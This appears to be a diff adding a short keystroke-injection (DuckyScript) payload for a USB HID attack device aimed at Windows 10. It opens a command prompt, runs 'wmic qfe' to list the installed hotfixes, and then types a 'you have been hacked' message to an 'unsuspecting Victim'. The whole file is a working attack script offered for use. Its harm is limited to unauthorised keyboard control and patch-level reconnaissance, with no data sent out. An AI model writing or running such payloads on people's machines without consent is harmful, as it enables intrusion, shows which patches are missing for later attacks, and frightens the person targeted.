@@ -1,0 +1,27 @@
+
+REM Title:         List Hotfixes and Warning Message            
+REM Description:   List Hotfixes on a Windows Machine and then prints message of warning to the unsuspecting Victim
+REM Author:        John Fawcett
+REM Version:       1.1
+REM Category:      General
+REM Target:        Windows 10 (CMD)
+REM Attackmodes:   HID
+
+
+REM ######Stage 1 Open CMD AND Get Hotfixes#########
+
+REM Open cmd
+DELAY 2000
+GUI r
+DELAY 2000
+STRING cmd
+DELAY 500
+ENTER
+DELAY 500
+STRING wmic qfe
+ENTER
+
+REM ##### Stage 2 Print Message#######
+
+DELAY 1000
+STRING CONGRATULATIONS, YOU HAVE BEEN HACKED!!!!
